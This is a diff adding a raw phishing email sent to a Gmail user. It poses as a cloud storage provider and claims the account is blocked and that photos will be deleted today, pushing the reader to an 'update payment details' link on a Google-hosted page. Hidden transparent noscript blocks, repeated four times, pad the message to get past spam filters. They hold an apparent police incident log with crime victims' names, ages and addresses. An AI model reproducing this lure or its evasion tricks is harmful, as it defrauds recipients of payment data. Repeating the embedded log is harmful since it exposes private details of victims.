@@ -1,0 +1,557 @@
+Delivered-To: silverfirefox@gmail.com
+Received: by 2002:a98:b90c:0:b0:261:85fe:9a8 with SMTP id a12csp126677eiy;
+        Tue, 31 Mar 2026 18:31:22 -0700 (PDT)
+X-Forwarded-Encrypted: i=2; AJvYcCUB+4KFldEpYIctqYYKg5YteLvcOPoU64QuwBUk8C8pDeAwq8ajsiYOfdJr8Gbp3Qa+eXyBv37q5VCP6LsG@gmail.com
+X-Received: by 2002:a05:6a00:2e1e:b0:82c:ded1:261f with SMTP id d2e1a72fcca58-82ce8991270mr1732272b3a.27.1775007082138;
+        Tue, 31 Mar 2026 18:31:22 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1775007082; cv=none;
+        d=google.com; s=arc-20240605;
+        b=luBTF3+XmqUtQMIiZPdfWUghr3yglW/O2xsdMBjs8Ipypay+o2g4zJ6AicIsO9FWmR
+         E5VKdqJKJc4sqQTDifUY83pvIr8PJ+uCa9BA5K+aVoRZTXUws1f8HLBxW+gE/98Ewqrf
+         ddd1B9CNNfvKjFPQz84Cj9h3gHTTyntlveDm591xembChOmwsgUTaVcLAwlNLkXGeHii
+         IMh958qZ5EVBbOWpoyc8n1MiLPD4gmPZytC51h3FzIuY2+G2G4wFb94ZjFm1Mwl6BZZi
+         7x60Fuic3w3nh58c0avq5wZDbLv0GFEySiT61lgR8ejD3fT7mirp7guEL2o2b1mDHZUK
+         1vmQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=message-id:date:from:envelope-to:feedback-id:list-unsubscribe-post
+         :subject:to:dkim-signature;
+        bh=9r50jBAe8136taBFr/lYreGL7F1Gy0UdEBMijYwWnHc=;
+        fh=GMSS3jjCGonHKdIEfnKvsCy6Z0N1IFfgELPgutHS5/4=;
+        b=U2RREkbQwsMNRKUcBPfiLDoZYNwgk16Rcn5ZIljqsBcw4wLdjK88APKfYxrN18a8vK
+         Wbi1HKkRznfO0OH7eCncmwfJUNt9+I9RpLVUHAIhYiJ1YUp3HftUCSnZbkd6LiRbQahE
+         AKfXVGjrzSxuLfycLjGAZaNgYOGVdVzmSVyVem7plpsW3UIVtjvtXhBiX5xKGHxWiqz/
+         O7SMRNWpAz11FkeccRA3pC5MRMunqR6SJNWc9VcMzAFuT6EAlWoW6ViwZmE328DGPxMu
+         /H8/TXqdSSQC1K6PLtu9I5knb0zQe+6CKWkLI9SLtgbDfSzHdSUZ+l6fVXu21xiVpUhB
+         irkw==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=permerror (no key for signature) header.i=@google56989.com header.s=s1 header.b=TzRL6E3c;
+       spf=pass (google.com: domain of 65772537201401940796.chrjwfjz@myliqfxx.suntkifs.me designates 91.223.3.142 as permitted sender) smtp.mailfrom=65772537201401940796.ChRJwFjZ@myliqfxx.suntkifs.me
+Return-Path: <65772537201401940796.ChRJwFjZ@myliqfxx.suntkifs.me>
+Received: from businessend.humaneditedlistings.com (businessend.humaneditedlistings.com. [91.223.3.142])
+        by mx.google.com with ESMTPS id d2e1a72fcca58-82cdf63716esi6445557b3a.98.2026.03.31.18.31.20
+        for <silverfirefox@gmail.com>
+        (version=TLS1 cipher=ECDHE-ECDSA-AES128-SHA bits=128/128);
+        Tue, 31 Mar 2026 18:31:22 -0700 (PDT)
+Received-SPF: pass (google.com: domain of 65772537201401940796.chrjwfjz@myliqfxx.suntkifs.me designates 91.223.3.142 as permitted sender) client-ip=91.223.3.142;
+Authentication-Results: mx.google.com;
+       dkim=permerror (no key for signature) header.i=@google56989.com header.s=s1 header.b=TzRL6E3c;
+       spf=pass (google.com: domain of 65772537201401940796.chrjwfjz@myliqfxx.suntkifs.me designates 91.223.3.142 as permitted sender) smtp.mailfrom=65772537201401940796.ChRJwFjZ@myliqfxx.suntkifs.me
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=s1; d=google56989.com;
+ h=To:Subject:Content-Type:From:Date:Message-ID; i=qjd6l72wz8bshidr-no_reply@google56989.com;
+ bh=9r50jBAe8136taBFr/lYreGL7F1Gy0UdEBMijYwWnHc=;
+ b=TzRL6E3c6aY9ZtUtKMqCxQO1+Vd8E6SuXEHa9Uu6jcJsIeBJu8ThLHKg4mRFxvd5RP18L61q8iWf
+   wC/EseIzaXck0hlL3qbW3o6nfZaOCuHSWmogFVomdkPWksruStCyeMHgU0jfVErDGdeKQEuyP51c
+   p+YGfV1+olNcjgiaE2Qk/MZd1fgoKkLvMlUfIyyUHUySwOrRXjgVMBijHC9Hgnsztpu3WRJ4iDDR
+   9I/tvaHfqAP5eFTR4ng/QfI0NrG4r84TH/JE8XSzfcyYZPvTAXq/HvLkqAjqjktXT9Z4qArgnjeK
+   4OMZ0Gi7cmZWy4RnNtN5OrcCUJnQTApaXqPT7Q==
+To: support_6724476@googlemail.com
+X-TMASE-SNAP-Result: 7.341157.1990-2-6-43:0,88:4,48:8-5-8
+X-TM-AS-Result: No--69.819-7-66-3
+Subject: =?UTF-8?B?UmUgOiDwn5qrV2UndmUgYmxvY2tlZCB5b3VyIGFjY291bnQhIPCfk4Hwn5O4IFlvdXIgcGhvdG9zIGFuZCB2aWRlb3Mgd2lsbCBiZSBkZWxldGVkIG9uIDMxLTAzLTIwMjYg4pqg77iPIFJlbmV3IHlvdXIgc3Vic2NyaXB0aW9uIGZvciBmcmVlIG5vdyEjMTkyMjE=?=
+Content-Type: multipart/mixed; boundary="----=000000000000T8QGFGHY554DB3IR41N6QN"
+X-TMASE-MatchedRID: pzh0p0q1jhiepkddgqcvlm6qhcwrs5sqwahccu9zmn6v8jjb64waa2uccb6mtti5c940xefnd6sewizdb1at3tj7kyy80acqqdwebtub1iemkds7yuns0ude31dopvh5wn7unt9zp14kkd5yw48qn9s8pj0d1vyi7h6c2d2hro87mf8juvn1xg9czey5qz3n7siyq2juq1dmgonj8v8yzrr9v5eqaplp31b0dse9ebwq8j4jugbb9sqcup4w39ny30kqhziol42ua12hfl1r4e3dogikd4koj96t7iw5fhgywrvy4oxs9jrs2icu0b8s6ltdhf6w3uc9zzphmzwp58umifa3pvzztxtveq5nka7u3i6lgsxt05rkbhcz149wwgrlctamscprfm8w6r0akp2xyce7akjtkf68xvlc2ie9yc3toq5np6fbyfv8nb597h77hkfkbchpfp7e6ha9mwb2aw59saaxng0ar2amip402l9ur6rjeazwshftb9fn3nkur0xoe1ckbsguu3i9tch17yesv60qd1yt7bn1uxmr77w9u92bn7fd3ixw1wxoves7t8dbuzs7bsarog9ek1kj1ik3acs3393qruurgyde6wjfd5tt9kmediu9d7d6leoh5rrgayjn6qi9hus3f8zayip7k1kwjpfen89j2q9ouqz1e6yfxmz7l46ae9ia2yriiddinpzatootdpn2f4au26yt56fivdxx596a59l3ppu5f8j4m3wa0t6h043veg7vq69rqev67uosmhf9zjletbqh5pgwf9r0chb40byw6kejtom8m2r1r5jdpt5f72oxwmrcojvs02sj9916dh9bdzyv9l456jijst693r48md5nvplxzwc28k0owbo3yuksn4k17jvs56fefsjlcyh8n3bshsttnl7u4lrwm5eeqerue2wym5ztdneot78uesxvvd22nfx109qd1c8a5d2dh4f2bbnz63a0ikdgfhp5e3vhcc0n658z8hd3cx9t20ay81jvrrdf2dima1ejgj3hf7jnspt3glmq7n76ouqd13lfhp1vyxpf4r3hkeokvyejfa921hvb4v33z9ix1347ehhrv6ugn0kul5g38l3h2h5o4pkqxz32o7444twjqbnw83b1ui5co8c5nfa2hl1d7zprm7phvaobhjayu234l91p
+List-Unsubscribe-Post: List-Unsubscribe=One-Click
+Feedback-ID: 1.us-east-1.psHyoMfnH8hkuQnF72JGzzQK1By9IkayShm7uIk1GIc=:AmazonSES
+Received: from efianalytics.com (efianalytics.com. 216.244.76.116)
+X-TM-AS-GCONF: 0000
+X-PVIQ: mkto-RdMCgBVWW-NB6yqY-hZCeCx-FdLezk
+Envelope-To: support-931593017@googlemail.com
+X-TMASE-Result: 18--73.798-5.953
+X-MarketoID: vKD-Gha-ownhcpal:0:jJKk4V:9:oB3EVd:besLKX8VE
+X-EMMAIL: eeyga1rnuii9@2w3t6x5hro1a37.us
+X-ListMember: silverfirefox@gmail.com
+From: =?UTF-8?B?U2lsdmVyZmlyZWZveA==?=  <qjd6l72wz8bshidr-no_reply@google56989.com>
+Date: Tue, 31 Mar 2026 12:38:13 +0000 (UTC)
+Message-ID: <0F5EUEBP5NJL3CLBN6KN3VC0EHUX69HDD.1053442218253378753687933882912468065-xbcwqblz9vbtdnzzd1jisagco31mdl0nobkm@google56989.com>
+X-TMASE-Version: IMSVA-8.4776-10.7315-34428.659
+X-imss-scan-details: No--71.3-9-89-3
+X-TM-AS-Product-Ver: IMSVA-9.77-8.498-34428.659
+
+------=000000000000T8QGFGHY554DB3IR41N6QN
+Content-Type: multipart/mixed; boundary="_======NEXTPARTTaille_mark_1376885411====_?!:"
+
+--_======NEXTPARTTaille_mark_1376885411====_?!:
+Content-Type: multipart/alternative;
+  boundary="_----------=_MCart_4411423876414"
+
+--_----------=_MCart_4411423876414
+Content-Type: text/html; charset=utf-8
+
+
+
+
+
+
+
+<center>
+<p style="max-width: 0px;max-height: 0px;color: transparent">  <noscript>
+Incident Number Reported On Location Offense Descriptions Victim Full Name Victim Age
+25-0012419 2026.03.31-12 9905 McCraw Dr DUTY ON STRIKING UNATTENDED VEHICLE
+25-0012817 2026.03.31-12 1321 Copus Ave EMERGENCY DETENTION ORDER 45
+25-0012808 2026.03.31-12 1235 S Jackson Ave CRIMINAL TRESPASS Korina, Ruiz 49
+25-0012484 2026.03.31-12 E Monahans St & Terlingua Ave EXECUTION OF CAPIAS OR ARREST WARRANT
+25-0012805 2026.03.31-12 E 13th St & N Tom Green Ave Poss Of Drug Para For Use
+25-0012844 2026.03.31-12 W 33rd St & N County Road POSS CS PG 1/1-B <1G
+25-0012619 2026.03.31-12 4590 N Texas Ave FTC Speed To Avoid Accident With Person Or Vehicle
+25-0012486 2026.03.31-12 124 Blue Dr ASSAULT CAUSES BODILY INJURY FAMILY MEMBER Willsheina, Fox 32
+25-0012166 2026.03.31-12 1111 BOURBON ST Simple Assault Physical Contact - Family Violence Daniela, Sabas Valverde 29
+25-0012673 2026.03.31-12 4775 Oakwood Dr THEFT OF FIREARM Casey, Younger 49
+25-0012117 2026.03.31-12 Central Odessa PROSTITUTION
+25-0012283 2026.03.31-12 N Grandview Ave & NE Loop 338 DRIVING W/LIC INV W/PREV CONV/SUSP/W/O FIN RES
+25-0012002 2026.03.31-12 4101 E 42nd St BURGLARY OF VEHICLES ; UNAUTH USE OF VEHICLE
+25-0012548 2026.03.31-12 2450 W Loop 338 POSS CS PG 1/1-B <1G ; POSS CS PG 2 < 1G Elizabeth, Riojas 49
+25-0012439 2026.03.31-12 910 N Alleghaney Ave RUNAWAY 15
+25-0012827 2026.03.31-12 1611 Eastover Dr THEFT PROP >=$2,500<$30K Jose, Dieguez Perez 41
+25-0012934 2026.03.31-12 9300 Hawthorne Ct COLLISION INVOLVING DAMAGE TO VEHICLE>=$200
+25-0012973 2026.03.31-12 I-20 Bus & S Meadow Ave POSS CS PG 1/1-B <1G
+25-0012693 2026.03.31-12 900 W 8th St EXECUTION OF CAPIAS OR ARREST WARRANT
+
+</noscript>
+
+</p>
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Storage Notification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .cloud-icon {
+            width: 60px;
+            height: 40px;
+            background: linear-gradient(135deg, #87ceeb, #4682b4);
+            border-radius: 20px;
+            position: relative;
+            margin-right: 10px;
+        }
+        
+        .cloud-icon::before {
+            content: "";
+            position: absolute;
+            top: -15px;
+            left: 10px;
+            width: 30px;
+            height: 30px;
+            background: linear-gradient(135deg, #87ceeb, #4682b4);
+            border-radius: 50%;
+        }
+        
+        .cloud-icon::after {
+            content: "";
+            position: absolute;
+            top: -10px;
+            right: 5px;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #87ceeb, #4682b4);
+            border-radius: 50%;
+        }
+        
+        .logo-text {
+            font-size: 36px;
+            color: #4682b4;
+            font-weight: normal;
+        }
+        
+        .alert-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .alert-icon {
+            background-color: #dc3545;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        
+        .alert-text {
+            flex: 1;
+        }
+        
+        .alert-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .disabled-warning {
+            text-align: center;
+            color: #dc3545;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        
+        .x-mark {
+            color: #dc3545;
+            font-size: 20px;
+            margin: 0 10px;
+        }
+        
+        .blue-warning {
+            background-color: #5bc0de;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        .order-details {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .order-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .detail-row {
+            margin-bottom: 8px;
+        }
+        
+        .detail-label {
+            font-weight: bold;
+            display: inline-block;
+            width: 140px;
+        }
+        
+        .detail-value {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        
+        .warning-text {
+            margin: 15px 0;
+            color: #666;
+        }
+        
+        .last-warning {
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .warning-header {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .warning-icon {
+            color: #ffc107;
+            margin: 0 5px;
+        }
+        
+        .prohibition-icon {
+            color: #dc3545;
+            margin-left: 5px;
+        }
+        
+        .blocked-text {
+            color: #dc3545;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        
+        .update-button {
+            background-color: #5bc0de;
+            color: white;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+            text-decoration: none;
+            text-align: center;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #666;
+        }
+        
+        .disclaimer {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <div class="cloud-icon"></div>
+            <div class="logo-text">Cloud</div>
+        </div>
+    </div>
+    
+    <div class="alert-box">
+        <div class="alert-icon">!</div>
+        <div class="alert-text">
+            <div class="alert-title">Your payment method has expired: update your payment information...</div>
+            <div>If you don't have enough Cloud space, you can upgrade your storage plan</div>
+        </div>
+    </div>
+    
+    <div class="disabled-warning">
+        <span class="x-mark">✗</span>
+        Your Cloud Has Been Disabled
+        <span class="x-mark">✗</span>
+    </div>
+    
+    <div class="blue-warning">
+        We were unable to renew your Cloud storage!! Without Cloud space, you may lose all your data and files stored in the Cloud Service
+    </div>
+    
+    <div class="order-details">
+        <div class="order-title">Order Details:</div>
+        <div class="detail-row">
+            <span class="detail-label">Subscription Plan:</span>
+            <span class="detail-value">250GB</span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Product:</span>
+            <span class="detail-value">Cloud Storage</span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Expiration date:</span>
+            <span class="detail-value">Tue, Mar 31 2026</span>
+        </div>
+    </div>
+    
+    <div class="warning-text">
+        Without Cloud space, you may not be able to store all your data and files in the Cloud service
+    </div>
+    
+    <div class="last-warning">
+        <div class="warning-header">
+            Last warning <span class="warning-icon">⚠</span>: your data will be deleted <span class="prohibition-icon">⊘</span>!
+        </div>
+        <div class="blocked-text">
+            Your Account has been Blocked All Your Photos and videos will be Removed Today!
+        </div>
+    </div>
+    
+    <a href="https://storage.googleapis.com/qo0p0pbb3yo6n33i/7hu67gt92x5k8n38/3595a8f.html#VFZ9v7.jsv?gglWH6ccjRKwcdcqkcdckBc1cgM4dscPhcbbbbQ" class="update-button" style=" color: white">UPDATE MY PAYMENT DETAILS</a>
+    
+    <div class="footer">
+        <div>Thank you for trusting us</div>
+        <div>Best regards</div>
+    </div>
+    
+  
+</div>
+  <p style="text-align:center;font-family: 'Open Sans','Arial','Helvetica',sans-serif;font-size:13px;"><br><br> 
+The advertiser does not manage your subscription. <br>
+ If you prefer not to receive further communication please unsubscribe  <a href="https://storage.googleapis.com/qo0p0pbb3yo6n33i/7hu67gt92x5k8n38/3595a8f.html#VFZ9v7.jsv?gglWH6fcjRKwcdcqkcdckBc1cgM4dscPhcbbbbQ">   here </a><br>
+ Or write to: 1344 Disc, Dr 1006 Sparks NV 89436<br>
+<br>
+ </p>
+</body>
+</html>
+
+
+
+
+
+
+
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+   
+                                                                                                                                                                       
+<p><br><br>
+ 
+
+  
+  
+  
+
+
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p><br><br>
+ 
+
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p style="max-width: 0px;max-height: 0px;color: transparent">  <noscript>
+Incident Number Reported On Location Offense Descriptions Victim Full Name Victim Age
+25-0012264 2026.03.31-12 9905 McCraw Dr DUTY ON STRIKING UNATTENDED VEHICLE
+25-0012559 2026.03.31-12 1321 Copus Ave EMERGENCY DETENTION ORDER 45
+25-0012600 2026.03.31-12 1235 S Jackson Ave CRIMINAL TRESPASS Korina, Ruiz 49
+25-0012477 2026.03.31-12 E Monahans St & Terlingua Ave EXECUTION OF CAPIAS OR ARREST WARRANT
+25-0012976 2026.03.31-12 E 13th St & N Tom Green Ave Poss Of Drug Para For Use
+25-0012491 2026.03.31-12 W 33rd St & N County Road POSS CS PG 1/1-B <1G
+25-0012794 2026.03.31-12 4590 N Texas Ave FTC Speed To Avoid Accident With Person Or Vehicle
+25-0012830 2026.03.31-12 124 Blue Dr ASSAULT CAUSES BODILY INJURY FAMILY MEMBER Willsheina, Fox 32
+25-0012700 2026.03.31-12 1111 BOURBON ST Simple Assault Physical Contact - Family Violence Daniela, Sabas Valverde 29
+25-0012678 2026.03.31-12 4775 Oakwood Dr THEFT OF FIREARM Casey, Younger 49
+25-0012767 2026.03.31-12 Central Odessa PROSTITUTION
+25-0012280 2026.03.31-12 N Grandview Ave & NE Loop 338 DRIVING W/LIC INV W/PREV CONV/SUSP/W/O FIN RES
+25-0012634 2026.03.31-12 4101 E 42nd St BURGLARY OF VEHICLES ; UNAUTH USE OF VEHICLE
+25-0012019 2026.03.31-12 2450 W Loop 338 POSS CS PG 1/1-B <1G ; POSS CS PG 2 < 1G Elizabeth, Riojas 49
+25-0012897 2026.03.31-12 910 N Alleghaney Ave RUNAWAY 15
+25-0012226 2026.03.31-12 1611 Eastover Dr THEFT PROP >=$2,500<$30K Jose, Dieguez Perez 41
+25-0012495 2026.03.31-12 9300 Hawthorne Ct COLLISION INVOLVING DAMAGE TO VEHICLE>=$200
+25-0012337 2026.03.31-12 I-20 Bus & S Meadow Ave POSS CS PG 1/1-B <1G
+25-0012385 2026.03.31-12 900 W 8th St EXECUTION OF CAPIAS OR ARREST WARRANT
+
+</noscript>
+
+
+
+
+
+<div style="height:30px;"></div>
+
+</td>
+</tr>
+</table>
+<p style="max-width: 0px;max-height: 0px;color: transparent">  <noscript>
+Incident Number Reported On Location Offense Descriptions Victim Full Name Victim Age
+25-0012951 2026.03.31-12 9905 McCraw Dr DUTY ON STRIKING UNATTENDED VEHICLE
+25-0012832 2026.03.31-12 1321 Copus Ave EMERGENCY DETENTION ORDER 45
+25-0012280 2026.03.31-12 1235 S Jackson Ave CRIMINAL TRESPASS Korina, Ruiz 49
+25-0012422 2026.03.31-12 E Monahans St & Terlingua Ave EXECUTION OF CAPIAS OR ARREST WARRANT
+25-0012096 2026.03.31-12 E 13th St & N Tom Green Ave Poss Of Drug Para For Use
+25-0012746 2026.03.31-12 W 33rd St & N County Road POSS CS PG 1/1-B <1G
+25-0012025 2026.03.31-12 4590 N Texas Ave FTC Speed To Avoid Accident With Person Or Vehicle
+25-0012311 2026.03.31-12 124 Blue Dr ASSAULT CAUSES BODILY INJURY FAMILY MEMBER Willsheina, Fox 32
+25-0012789 2026.03.31-12 1111 BOURBON ST Simple Assault Physical Contact - Family Violence Daniela, Sabas Valverde 29
+25-0012747 2026.03.31-12 4775 Oakwood Dr THEFT OF FIREARM Casey, Younger 49
+25-0012081 2026.03.31-12 Central Odessa PROSTITUTION
+25-0012674 2026.03.31-12 N Grandview Ave & NE Loop 338 DRIVING W/LIC INV W/PREV CONV/SUSP/W/O FIN RES
+25-0012587 2026.03.31-12 4101 E 42nd St BURGLARY OF VEHICLES ; UNAUTH USE OF VEHICLE
+25-0012868 2026.03.31-12 2450 W Loop 338 POSS CS PG 1/1-B <1G ; POSS CS PG 2 < 1G Elizabeth, Riojas 49
+25-0012743 2026.03.31-12 910 N Alleghaney Ave RUNAWAY 15
+25-0012897 2026.03.31-12 1611 Eastover Dr THEFT PROP >=$2,500<$30K Jose, Dieguez Perez 41
+25-0012117 2026.03.31-12 9300 Hawthorne Ct COLLISION INVOLVING DAMAGE TO VEHICLE>=$200
+25-0012769 2026.03.31-12 I-20 Bus & S Meadow Ave POSS CS PG 1/1-B <1G
+25-0012579 2026.03.31-12 900 W 8th St EXECUTION OF CAPIAS OR ARREST WARRANT
+</noscript>
+
+</p>
+
+
+
+<div style="color: transparent;">
+
+--_----------=_MCart_4411423876414--
+--_======NEXTPARTTaille_mark_1376885411====_?!:--
+------=000000000000T8QGFGHY554DB3IR41N6QN
+Content-Type: multipart/mixed;boundary="_NexPart_0142845_Part0142845"
+
+--_NexPart_0142845_Part0142845
+
+Incident Number Reported On Location Offense Descriptions Victim Full Name Victim Age
+25-0012590 2026.03.31-12 9905 McCraw Dr DUTY ON STRIKING UNATTENDED VEHICLE
+25-0012500 2026.03.31-12 1321 Copus Ave EMERGENCY DETENTION ORDER 45
+25-0012124 2026.03.31-12 1235 S Jackson Ave CRIMINAL TRESPASS Korina, Ruiz 49
+25-0012208 2026.03.31-12 E Monahans St & Terlingua Ave EXECUTION OF CAPIAS OR ARREST WARRANT
+25-0012261 2026.03.31-12 E 13th St & N Tom Green Ave Poss Of Drug Para For Use
+25-0012940 2026.03.31-12 W 33rd St & N County Road POSS CS PG 1/1-B <1G
+25-0012523 2026.03.31-12 4590 N Texas Ave FTC Speed To Avoid Accident With Person Or Vehicle
+25-0012196 2026.03.31-12 124 Blue Dr ASSAULT CAUSES BODILY INJURY FAMILY MEMBER Willsheina, Fox 32
+25-0012282 2026.03.31-12 1111 BOURBON ST Simple Assault Physical Contact - Family Violence Daniela, Sabas Valverde 29
+25-0012720 2026.03.31-12 4775 Oakwood Dr THEFT OF FIREARM Casey, Younger 49
+25-0012120 2026.03.31-12 Central Odessa PROSTITUTION
+25-0012653 2026.03.31-12 N Grandview Ave & NE Loop 338 DRIVING W/LIC INV W/PREV CONV/SUSP/W/O FIN RES
+25-0012641 2026.03.31-12 4101 E 42nd St BURGLARY OF VEHICLES ; UNAUTH USE OF VEHICLE
+25-0012329 2026.03.31-12 2450 W Loop 338 POSS CS PG 1/1-B <1G ; POSS CS PG 2 < 1G Elizabeth, Riojas 49
+25-0012425 2026.03.31-12 910 N Alleghaney Ave RUNAWAY 15
+25-0012346 2026.03.31-12 1611 Eastover Dr THEFT PROP >=$2,500<$30K Jose, Dieguez Perez 41
+25-0012537 2026.03.31-12 9300 Hawthorne Ct COLLISION INVOLVING DAMAGE TO VEHICLE>=$200
+25-0012482 2026.03.31-12 I-20 Bus & S Meadow Ave POSS CS PG 1/1-B <1G
+25-0012148 2026.03.31-12 900 W 8th St EXECUTION OF CAPIAS OR ARREST WARRANT
+--_NexPart_0142845_Part0142845--
+------=000000000000T8QGFGHY554DB3IR41N6QN--
